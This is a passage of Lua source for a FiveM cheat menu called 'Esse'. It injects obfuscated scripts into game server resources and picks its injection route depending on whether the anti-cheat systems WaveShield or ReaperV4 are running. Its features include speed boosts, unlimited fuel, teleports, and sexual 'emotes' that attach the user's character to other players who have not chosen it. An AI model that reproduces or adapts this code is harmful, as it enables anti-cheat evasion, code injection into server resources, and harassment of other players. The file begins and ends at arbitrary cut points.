                                                        if veh and veh ~= 0 then
                                                            SetVehicleForwardSpeed_fn(veh, 100.0)
                                                        end
                                                    end

                                                    Wait_fn(0)
                                                end
                                            end)
                                        end
                                    ]])
                                    else
                                        MachoInjectResourceRaw("any", [[
                                        if VkLpOiUyTrEq == nil then VkLpOiUyTrEq = false end
                                        if VbNmQwErTyUi == nil then
                                            VbNmQwErTyUi = true

                                            local function YgT7FrqXcN()
                                                local ZxSeRtYhUiOp = CreateThread
                                                local LkJhGfDsAzXv = PlayerPedId
                                                local PoLkJhBgVfCd = GetVehiclePedIsIn
                                                local ErTyUiOpAsDf = IsControlPressed
                                                local GtHyJuKoLpMi = IsPedInAnyVehicle
                                                local HnJmKlIoPuYt = SetVehicleForwardSpeed

                                                ZxSeRtYhUiOp(function()
                                                    while true do
                                                        Wait(0)
                                                        if not VkLpOiUyTrEq then
                                                            Wait(500)
                                                            goto continue
                                                        end

                                                        local ped = LkJhGfDsAzXv()
                                                        if ErTyUiOpAsDf(0, 209) and GtHyJuKoLpMi(ped, false) then
                                                            local veh = PoLkJhBgVfCd(ped, false)
                                                            if veh and veh ~= 0 then
                                                                HnJmKlIoPuYt(veh, 100.0)
                                                            end
                                                        end

                                                        ::continue::
                                                    end
                                                end)
                                            end

                                            YgT7FrqXcN()
                                        end

                                        VkLpOiUyTrEq = true
                                    ]])
                                    end
                                else
                                    Esse:Notify("error", "Esse", "Boost Vehicle Off", 3000)

                                    if GetResourceState("WaveShield") == "started" then
                                        Injection(
                                        GetResourceState("monitor") == "started" and "monitor" or
                                        GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
                                        _G.superSpeedBoost = false
                                    ]])
                                    else
                                        Injection("any", [[
                                        VkLpOiUyTrEq = false
                                    ]])
                                    end
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Instant Brakes",
                            desc = 'this will instant brake your vehicle when you hold SPACE',
                            checked = false,
                            onSelect = function(checked)
                                local waveStarted = GetResourceState("WaveShield") == 'started'
                                local targetRes = (GetResourceState("monitor") == "started" and "monitor")
                                    or (GetResourceState("ox_lib") == "started" and "ox_lib")
                                    or "any"

                                if checked then
                                    if waveStarted then
                                        Esse:Notify("success", "Esse", "Instant Brakes On", 3000)
                                        Injection(
                                        GetResourceState("lb-phone") == "started" and "lb-phone" or
                                        GetResourceState("WaveShield") == "started" and "WaveShield" or "any", [[
                                        function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                        end

                                        if VkLpOiUyTrEq == nil then VkLpOiUyTrEq = false end
                                        VkLpOiUyTrEq = true

                                        local function initFlow(cb)
                                            local co = coroutine.create(cb)
                                            local ok, err
                                            while coroutine.status(co) ~= "dead" do
                                                ok, err = coroutine.resume(co)
                                                if not ok then

                                                    break
                                                end
                                                Citizen.Wait(0)
                                            end
                                        end

                                        initFlow(function()
                                            local function getPed() return PlayerPedId() end
                                            local PoLkJhBgVfCd = GetVehiclePedIsIn
                                            local ErTyUiOpAsDf = IsDisabledControlPressed
                                            local GtHyJuKoLpMi = IsPedInAnyVehicle
                                            local VbNmQwErTyUi = SetVehicleForwardSpeed

                                            while VkLpOiUyTrEq and not Unloaded do
                                                Wait(0)
                                                local ped = getPed()
                                                if not ped or ped == 0 then goto continue end
                                                local veh = PoLkJhBgVfCd(ped, false)
                                                if veh and veh ~= 0 then
                                                    if ErTyUiOpAsDf(0, 33) and GtHyJuKoLpMi(ped, false) then
                                                        VbNmQwErTyUi(veh, 0.0)
                                                    end
                                                end
                                                ::continue::
                                            end

                                            -- Restore on disable
                                            local ped = getPed()
                                            if ped and ped ~= 0 then
                                                local veh = PoLkJhBgVfCd(ped, false)
                                                if veh and veh ~= 0 then
                                                    -- No need to restore speed, just stop forcing 0
                                                end
                                            end
                                        end)
                                    ]])
                                    else
                                        Injection(targetRes, [[
                                        function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                        end

                                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetVehicleForwardSpeed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsDisabledControlPressed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                        if VkLpOiUyTrEq == nil then VkLpOiUyTrEq = false end
                                        VkLpOiUyTrEq = true

                                        local function YgT7FrqXcN()
                                            local ZxSeRtYhUiOp = CreateThread
                                            local LkJhGfDsAzXv = PlayerPedId
                                            local PoLkJhBgVfCd = GetVehiclePedIsIn
                                            local ErTyUiOpAsDf = IsDisabledControlPressed
                                            local GtHyJuKoLpMi = IsPedInAnyVehicle
                                            local VbNmQwErTyUi = SetVehicleForwardSpeed

                                            ZxSeRtYhUiOp(function()
                                                while VkLpOiUyTrEq and not Unloaded do
                                                    local ped = LkJhGfDsAzXv()
                                                    local veh = PoLkJhBgVfCd(ped, false)
                                                    if veh and veh ~= 0 then
                                                        if ErTyUiOpAsDf(0, 33) and GtHyJuKoLpMi(ped, false) then
                                                            VbNmQwErTyUi(veh, 0.0)
                                                        end
                                                    end
                                                    Wait(0)
                                                end
                                            end)
                                        end
                                        YgT7FrqXcN()
                                    ]])
                                        Esse:Notify("success", "Esse", "Instant Brakes On (Fallback)", 3000)
                                    end
                                else
                                    if waveStarted then
                                        Esse:Notify("success", "Esse", "Instant Brakes Off", 3000)
                                        Injection(
                                        GetResourceState("lb-phone") == "started" and "lb-phone" or
                                        GetResourceState("WaveShield") == "started" and "WaveShield" or "any", [[
                                        VkLpOiUyTrEq = false
                                    ]])
                                    else
                                        Injection(targetRes, [[
                                        VkLpOiUyTrEq = false
                                    ]])
                                        Esse:Notify("success", "Esse", "Instant Brakes Off (Fallback)", 3000)
                                    end
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Easy Handling",
                            desc = 'this will gives u easy handling on your vehicle',
                            checked = false,
                            onSelect = function(checked)
                                local waveStarted = GetResourceState("WaveShield") == 'started'
                                local targetRes = (GetResourceState("monitor") == "started" and "monitor")
                                    or (GetResourceState("ox_lib") == "started" and "ox_lib")
                                    or "any"

                                if checked then
                                    if waveStarted then
                                        Esse:Notify("success", "Esse", "Easy Handling On", 3000)
                                        MachoInjectResourceRaw("WaveShield", [[
                                        function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                        end

                                        if NvGhJkLpOiUy == nil then NvGhJkLpOiUy = false end
                                        NvGhJkLpOiUy = true

                                        local function initFlow(cb)
                                            local co = coroutine.create(cb)
                                            local ok, err
                                            while coroutine.status(co) ~= "dead" do
                                                ok, err = coroutine.resume(co)
                                                if not ok then

                                                    break
                                                end
                                                Citizen.Wait(0)
                                            end
                                        end

                                        initFlow(function()
                                            local function getPed() return GetPlayerPed(-1) end
                                            local TyUiOpAsDfGh = GetVehiclePedIsIn
                                            local UyTrBnMvCxZl = SetVehicleGravityAmount
                                            local PlMnBvCxZaSd = SetVehicleStrong

                                            while NvGhJkLpOiUy and not Unloaded do
                                                Wait(0)
                                                local ped = getPed()
                                                if not ped or ped == 0 then goto continue end
                                                local veh = TyUiOpAsDfGh(ped, false)
                                                if veh and veh ~= 0 then
                                                    UyTrBnMvCxZl(veh, 73.0)
                                                    PlMnBvCxZaSd(veh, true)
                                                end
                                                ::continue::
                                            end

                                            local ped = getPed()
                                            if ped and ped ~= 0 then
                                                local veh = TyUiOpAsDfGh(ped, false)
                                                if veh and veh ~= 0 then
                                                    UyTrBnMvCxZl(veh, 9.8)
                                                    PlMnBvCxZaSd(veh, false)
                                                end
                                            end
                                        end)
                                    ]])
                                    else
                                        Injection(targetRes, [[
                                        function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                        end

                                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetVehicleGravityAmount", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetVehicleStrong", function(originalFn, ...) return originalFn(...) end)
                                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                        if NvGhJkLpOiUy == nil then NvGhJkLpOiUy = false end
                                        NvGhJkLpOiUy = true

                                        local function KbZwVoYtLx()
                                            local BtGhYtUlOpLk = CreateThread
                                            local WeRtYuIoPlMn = PlayerPedId
                                            local TyUiOpAsDfGh = GetVehiclePedIsIn
                                            local UyTrBnMvCxZl = SetVehicleGravityAmount
                                            local PlMnBvCxZaSd = SetVehicleStrong

                                            BtGhYtUlOpLk(function()
                                                while NvGhJkLpOiUy and not Unloaded do
                                                    local ped = WeRtYuIoPlMn()
                                                    local veh = TyUiOpAsDfGh(ped, false)
                                                    if veh and veh ~= 0 then
                                                        UyTrBnMvCxZl(veh, 73.0)
                                                        PlMnBvCxZaSd(veh, true)
                                                    end
                                                    Wait(0)
                                                end

                                                -- Restore
                                                local ped = WeRtYuIoPlMn()
                                                local veh = TyUiOpAsDfGh(ped, false)
                                                if veh and veh ~= 0 then
                                                    UyTrBnMvCxZl(veh, 9.8)
                                                    PlMnBvCxZaSd(veh, false)
                                                end
                                            end)
                                        end

                                        KbZwVoYtLx()
                                    ]])
                                        Esse:Notify("success", "Esse", "Easy Handling On (Fallback)", 3000)
                                    end
                                else
                                    if waveStarted then
                                        Esse:Notify("success", "Esse", "Easy Handling Off", 3000)
                                        MachoInjectResourceRaw("WaveShield", [[
                                        NvGhJkLpOiUy = false
                                        local UyTrBnMvCxZl = SetVehicleGravityAmount
                                        local PlMnBvCxZaSd = SetVehicleStrong
                                        local ped = PlayerPedId()
                                        local veh = GetVehiclePedIsIn(ped, false)
                                        if veh and veh ~= 0 then
                                            UyTrBnMvCxZl(veh, 9.8)
                                            PlMnBvCxZaSd(veh, false)
                                        end
                                    ]])
                                    else
                                        Injection(targetRes, [[
                                        NvGhJkLpOiUy = false
                                        local UyTrBnMvCxZl = SetVehicleGravityAmount
                                        local PlMnBvCxZaSd = SetVehicleStrong
                                        local ped = PlayerPedId()
                                        local veh = GetVehiclePedIsIn(ped, false)
                                        if veh and veh ~= 0 then
                                            UyTrBnMvCxZl(veh, 9.8)
                                            PlMnBvCxZaSd(veh, false)
                                        end
                                    ]])
                                        Esse:Notify("success", "Esse", "Easy Handling Off (Fallback)", 3000)
                                    end
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Rainbow Vehicle",
                            desc = 'this will change your vehicle color to rainbow',
                            checked = false,
                            onSelect = function(checked)
                                local target = GetResourceState("monitor") == "started" and "monitor"
                                    or GetResourceState("ox_lib") == "started" and "ox_lib"
                                    or "any"
                                if checked then
                                    Esse:Notify("success", "Esse", "Rainbow Vehicle On", 3000)

                                    if GetResourceState("WaveShield") == "started" then
                                        Injection(target, [[
                                        if not _G.EsseRainbow then
                                            _G.EsseRainbow = { enabled = false, originals = {}, thread = nil }
                                        end
                                        _G.EsseRainbow.enabled = true

                                        local function hNative(name, wrapper)
                                            local orig = _G[name]
                                            if not orig or type(orig) ~= "function" then return end
                                            if not _G.EsseRainbow.originals[name] then
                                                _G.EsseRainbow.originals[name] = orig
                                            end
                                            _G[name] = function(...) return wrapper(orig, ...) end
                                        end

                                        hNative("Wait",                     function(o, ms) return o(ms) end)
                                        hNative("GetGameTimer",             function(o)    return o() end)
                                        hNative("math.floor",               function(o, x) return o(x) end)
                                        hNative("math.sin",                 function(o, x) return o(x) end)
                                        hNative("GetVehiclePedIsIn",        function(o, p, l) return o(p, l) end)
                                        hNative("DoesEntityExist",          function(o, e) return o(e) end)
                                        hNative("SetVehicleCustomPrimaryColour",   function(o, v, r, g, b) return o(v, r, g, b) end)
                                        hNative("SetVehicleCustomSecondaryColour", function(o, v, r, g, b) return o(v, r, g, b) end)
                                        hNative("PlayerPedId",              function(o)    return o() end)

                                        if not _G.EsseRainbow.thread then
                                            _G.EsseRainbow.thread = coroutine.create(function()
                                                local freq = 1.0
                                                local function getRainbowColor()
                                                    local t = GetGameTimer() / 1000
                                                    local r = math.floor(math.sin(t * freq + 0) * 127 + 128)
                                                    local g = math.floor(math.sin(t * freq + 2) * 127 + 128)
                                                    local b = math.floor(math.sin(t * freq + 4) * 127 + 128)
                                                    return r, g, b
                                                end
                                                while _G.EsseRainbow.enabled do
                                                    local ped = PlayerPedId()
                                                    local veh = GetVehiclePedIsIn(ped, false)
                                                    if veh and veh ~= 0 and DoesEntityExist(veh) then
                                                        local r, g, b = getRainbowColor()
                                                        SetVehicleCustomPrimaryColour(veh, r, g, b)
                                                        SetVehicleCustomSecondaryColour(veh, r, g, b)
                                                    end
                                                    Wait(0)
                                                end
                                            end)

                                            while _G.EsseRainbow.enabled and coroutine.status(_G.EsseRainbow.thread) ~= "dead" do
                                                coroutine.resume(_G.EsseRainbow.thread)
                                                Citizen.Wait(0)
                                            end
                                        end
                                    ]])
                                    else
                                        Injection(target, [[
                                        function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                        end

                                        hNative("CreateThread", function(o, ...) return o(...) end)
                                        hNative("Wait",         function(o, ...) return o(...) end)
                                        hNative("GetGameTimer", function(o, ...) return o(...) end)
                                        hNative("math.floor",   function(o, ...) return o(...) end)
                                        hNative("math.sin",     function(o, ...) return o(...) end)
                                        hNative("GetVehiclePedIsIn", function(o, ...) return o(...) end)
                                        hNative("DoesEntityExist",   function(o, ...) return o(...) end)
                                        hNative("SetVehicleCustomSecondaryColour", function(o, ...) return o(...) end)
                                        hNative("SetVehicleCustomPrimaryColour",   function(o, ...) return o(...) end)
                                        hNative("PlayerPedId", function(o, ...) return o(...) end)

                                        if GxRpVuNzYiTq == nil then GxRpVuNzYiTq = false end
                                        GxRpVuNzYiTq = true

                                        local function jqX7TvYzWq()
                                            local WvBnMpLsQzTx = GetGameTimer
                                            local VcZoPwLsEkRn = math.floor
                                            local DfHkLtQwAzCx = math.sin
                                            local PlJoQwErTgYs = CreateThread
                                            local MzLxVoKsUyNz = GetVehiclePedIsIn
                                            local EyUiNkOpLtRg = PlayerPedId
                                            local KxFwEmTrZpYq = DoesEntityExist
                                            local UfBnDxCrQeTg = SetVehicleCustomPrimaryColour
                                            local BvNzMxLoPwEq = SetVehicleCustomSecondaryColour
                                            local yGfTzLkRn = 1.0

                                            local function HrCvWbXuNz(freq)
                                                local color = {}
                                                local t = WvBnMpLsQzTx() / 1000
                                                color.r = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 0) * 127 + 128)
                                                color.g = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 2) * 127 + 128)
                                                color.b = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 4) * 127 + 128)
                                                return color
                                            end

                                            PlJoQwErTgYs(function()
                                                while GxRpVuNzYiTq and not Unloaded do
                                                    local ped = EyUiNkOpLtRg()
                                                    local veh = MzLxVoKsUyNz(ped, false)
                                                    if veh and veh ~= 0 and KxFwEmTrZpYq(veh) then
                                                        local rgb = HrCvWbXuNz(yGfTzLkRn)
                                                        UfBnDxCrQeTg(veh, rgb.r, rgb.g, rgb.b)
                                                        BvNzMxLoPwEq(veh, rgb.r, rgb.g, rgb.b)
                                                    end
                                                    Wait(0)
                                                end
                                            end)
                                        end
                                        jqX7TvYzWq()
                                    ]])
                                    end
                                else
                                    Esse:Notify("error", "Esse", "Rainbow Vehicle Off", 3000)
                                    if GetResourceState("WaveShield") == "started" then
                                        Injection(target, [[
                                        if not _G.EsseRainbow then
                                            _G.EsseRainbow = { enabled = false, originals = {}, thread = nil }
                                        end
                                        _G.EsseRainbow.enabled = false

                                        for name, orig in pairs(_G.EsseRainbow.originals) do
                                            if _G[name] then _G[name] = orig end
                                        end

                                        if _G.EsseRainbow.thread and coroutine.status(_G.EsseRainbow.thread) ~= "dead" then
                                            coroutine.resume(_G.EsseRainbow.thread)
                                        end

                                        local co = coroutine.create(function()
                                            local ped = PlayerPedId()
                                            local veh = GetVehiclePedIsIn(ped, false)
                                            if veh and veh ~= 0 and DoesEntityExist(veh) then
                                                SetVehicleCustomPrimaryColour(veh, 255, 255, 255)
                                                SetVehicleCustomSecondaryColour(veh, 255, 255, 255)
                                            end
                                        end)
                                        while coroutine.status(co) ~= "dead" do
                                            coroutine.resume(co)
                                            Citizen.Wait(0)
                                        end
                                    ]])
                                    else
                                        Injection(target, [[
                                        function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                        end

                                        hNative("CreateThread", function(o, ...) return o(...) end)
                                        hNative("Wait",         function(o, ...) return o(...) end)
                                        hNative("GetGameTimer", function(o, ...) return o(...) end)
                                        hNative("math.floor",   function(o, ...) return o(...) end)
                                        hNative("math.sin",     function(o, ...) return o(...) end)
                                        hNative("GetVehiclePedIsIn", function(o, ...) return o(...) end)
                                        hNative("DoesEntityExist",   function(o, ...) return o(...) end)
                                        hNative("SetVehicleCustomSecondaryColour", function(o, ...) return o(...) end)
                                        hNative("SetVehicleCustomPrimaryColour",   function(o, ...) return o(...) end)
                                        hNative("PlayerPedId", function(o, ...) return o(...) end)

                                        GxRpVuNzYiTq = false
                                    ]])
                                    end
                                end
                            end,
                        },
                        {
                            type = "checkbox",
                            label = "Unlimited Fuel",
                            checked = false,
                            desc = 'this will unlimited fuel for your vehicle',
                            onSelect = function(checked)
                                if checked then
                                    Esse:Notify("success", "Esse", "Unlimited Fuel On", 3000)
                                    Injection(
                                    GetResourceState("monitor") == "started" and "monitor" or
                                    GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end

                                _G[nativeName] = function(...)
                                    return newFunction(originalNative, ...)
                                end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetVehicleFuelLevel", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                            if BlNkJmLzXcVb == nil then BlNkJmLzXcVb = false end
                            BlNkJmLzXcVb = true

                            local function LqWyXpR3tV()
                                local TmPlKoMiJnBg = CreateThread
                                local ZxCvBnMaSdFg = PlayerPedId
                                local YhUjIkOlPlMn = IsPedInAnyVehicle
                                local VcXzQwErTyUi = GetVehiclePedIsIn
                                local KpLoMkNjBhGt = DoesEntityExist
                                local JkLzXcVbNmAs = SetVehicleFuelLevel

                                TmPlKoMiJnBg(function()
                                    while BlNkJmLzXcVb and not Unloaded do
                                        local ped = ZxCvBnMaSdFg()
                                        if YhUjIkOlPlMn(ped, false) then
                                            local veh = VcXzQwErTyUi(ped, false)
                                            if KpLoMkNjBhGt(veh) then
                                                JkLzXcVbNmAs(veh, 100.0)
                                            end
                                        end
                                        Wait(100)
                                    end
                                end)
                            end

                            LqWyXpR3tV()
                            ]])
                                else
                                    Esse:Notify("error", "Esse", "Unlimited Fuel Off", 3000)
                                    Injection(
                                    GetResourceState("monitor") == "started" and "monitor" or
                                    GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end

                                _G[nativeName] = function(...)
                                    return newFunction(originalNative, ...)
                                end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetVehicleFuelLevel", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                            BlNkJmLzXcVb = false
                            ]])
                                end
                            end
                        },
                    }
                },
            }
        },
        {
            icon = "",
            label = "Emotes",
            type = "subMenu",
            categories = {
                {
                    label = "Emote Menu",
                    tabs = {
                        {
                            type = "button",
                            label = "Detach All Entitys",
                            desc = 'this will detach all entitys',
                            onSelect = function()
                                MachoInjectResourceRaw("any", [[
                        local function zXqLJWt7pN()
                            local xPvA71LtqzW = ClearPedTasks
                            local bXcT2mpqR9f = DetachEntity

                            xPvA71LtqzW(PlayerPedId())
                            bXcT2mpqR9f(PlayerPedId())
                        end

                        zXqLJWt7pN()
                        ]])
                            end
                        },
                        { type = "divider", label = "Emotes" },
                        {
                            type = "button",
                            desc = 'this will twerk selected player',
                            label = "Twerk Player",
                            onSelect = function()
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "Esse", "You must select a player first!", 3000)
                                    return
                                end

                                for _, playerId in ipairs(targetPlayers) do
                                    MachoInjectResourceRaw("any", string.format([[
                                    CreateThread(function()
                                        local playerPed = PlayerPedId()
                                        local player = GetPlayerFromServerId(%d)
                                        if player == -1 then
                                            return
                                        end

                                        local targetPed = GetPlayerPed(player)
                                        if not targetPed or targetPed == 0 or not DoesEntityExist(targetPed) then
                                            return
                                        end

                                        -- Safety: prevent attaching twice or to yourself
                                        if targetPed == playerPed then
                                            return
                                        end

                                        if StarkDaddy then
                                            ClearPedSecondaryTask(playerPed)
                                            DetachEntity(playerPed, true, false)
                                            StarkDaddy = false

                                            return
                                        end

                                        StarkDaddy = true
                                        local dict = "switch@trevor@mocks_lapdance"
                                        RequestAnimDict(dict)
                                        local timeout = 0
                                        while not HasAnimDictLoaded(dict) and timeout < 100 do
                                            Wait(50)
                                            timeout = timeout + 1
                                        end

                                        if not HasAnimDictLoaded(dict) then

                                            return
                                        end

                                        -- Safety checks before attaching
                                        if not DoesEntityExist(targetPed) or not DoesEntityExist(playerPed) then
                                            return
                                        end

                                        -- Attach safely
                                        AttachEntityToEntity(playerPed, targetPed, 11816, 0.05, 0.38, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                                        TaskPlayAnim(playerPed, dict, "001443_01_trvs_28_idle_stripper", 8.0, -8.0, -1, 33, 0, false, false, false)


                                        -- Watchdog to auto detach if target dies/disconnects
                                        while StarkDaddy do
                                            Wait(1000)
                                            if not DoesEntityExist(targetPed) or IsEntityDead(targetPed) then
                                                ClearPedSecondaryTask(playerPed)
                                                DetachEntity(playerPed, true, false)
                                                StarkDaddy = false
                                                break
                                            end
                                        end
                                    end)
                                ]], playerId, playerId))
                                end

                                self:Notify("success", "Esse",
                                    "Attempted to twerk on " .. #targetPlayers .. " player(s).", 4000)
                            end
                        },
                        { type = "divider", label = "Vehicle Emotes" },
                        {
                            type = "button",
                            label = "Blow Driver",
                            desc = 'this will perform blow driver emote on selected players',
                            onSelect = function()
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "Esse", "You must select a player first!", 3000)
                                    return
                                end

                                for _, playerId in ipairs(targetPlayers) do
                                    MachoInjectResourceRaw("any", string.format([[
                                    CreateThread(function()
                                        local playerPed = PlayerPedId()
                                        local player = GetPlayerFromServerId(%d)
                                        if player == -1 then

                                            return
                                        end

                                        local targetPed = GetPlayerPed(player)
                                        if not targetPed or targetPed == 0 or not DoesEntityExist(targetPed) then

                                            return
                                        end

                                        -- Prevent doing animation on yourself
                                        if targetPed == playerPed then

                                            return
                                        end

                                        if BlowDriver then
                                            ClearPedSecondaryTask(playerPed)
                                            DetachEntity(playerPed, true, false)
                                            BlowDriver = false
                                            return
                                        end

                                        BlowDriver = true
                                        local dict = "mini@prostitutes@sexnorm_veh"
                                        RequestAnimDict(dict)
                                        local timeout = 0
                                        while not HasAnimDictLoaded(dict) and timeout < 100 do
                                            Wait(50)
                                            timeout = timeout + 1
                                        end

                                        if not HasAnimDictLoaded(dict) then
                                            return
                                        end

                                        -- Attach to driver seat roughly where needed
                                        AttachEntityToEntity(playerPed, targetPed, 11816, 0.25, 0.25, 0.0, 0.0, 0.0, 90.0, false, false, false, false, 2, true)
                                        TaskPlayAnim(playerPed, dict, "bj_loop_prostitute", 8.0, -8.0, -1, 33, 0, false, false, false)


                                        -- Watchdog to auto stop if target disappears or dies
                                        while BlowDriver do
                                            Wait(1000)
                                            if not DoesEntityExist(targetPed) or IsEntityDead(targetPed) then
                                                ClearPedSecondaryTask(playerPed)
                                                DetachEntity(playerPed, true, false)
                                                BlowDriver = false

                                                break
                                            end
                                        end
                                    end)
                                ]], playerId, playerId))
                                end

                                self:Notify("success", "Esse",
                                    "Attempted BlowDriver on " .. #targetPlayers .. " player(s).", 4000)
                            end
                        },
                    }
                },
            }
        },

        {
            icon = "",
            label = "Teleports",
            type = "subMenu",
            categories = {
                {
                    label = "Teleport Menu",
                    tabs = {
                        {
                            type = "button",
                            label = "FIB Building",
                            onSelect = function()
                                local waveShieldStart = GetResourceState("WaveShield") == 'started'
                                local ReaperStart = GetResourceState("ReaperV4") == 'started'
                                if waveShieldStart then
                                    MachoInjectResourceRaw("WaveShield", [[
                            local function HAZ6YqLRbM()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 140.43, -750.52, 258.15
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            HAZ6YqLRbM()
                        ]])
                                elseif
                                    ReaperStart then
                                    MachoInjectThread(0, "any", "", [[
                            local function HAZ6YqLRbM()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 140.43, -750.52, 258.15
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            HAZ6YqLRbM()
                        ]])
                                else
                                    MachoInjectResourceRaw("any", [[
                            local function HAZ6YqLRbM()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 140.43, -750.52, 258.15
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            HAZ6YqLRbM()
                        ]])
                                end
                            end
                        },
                        {
                            type = "button",
                            label = "Mission Row PD",
                            onSelect = function()
                                local waveShieldStart = GetResourceState("WaveShield") == 'started'
                                local ReaperStart = GetResourceState("ReaperV4") == 'started'

                                if waveShieldStart then
                                    MachoInjectResourceRaw("WaveShield", [[
                        local function oypB9FcNwK()
                            local aSdFgHjKlQwErTy = PlayerPedId
                            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                            local x, y, z = 425.1, -979.5, 30.7
                            local ped = aSdFgHjKlQwErTy()
                            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                        end

                        oypB9FcNwK()
                        ]])
                                elseif
                                    ReaperStart then
                                    MachoInjectThread(0, "any", "", [[
                    local function oypB9FcNwK()
                        local aSdFgHjKlQwErTy = PlayerPedId
                        local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                        local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                        local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                        local x, y, z = 425.1, -979.5, 30.7
                        local ped = aSdFgHjKlQwErTy()
                        local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                        xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                    end

                    oypB9FcNwK()
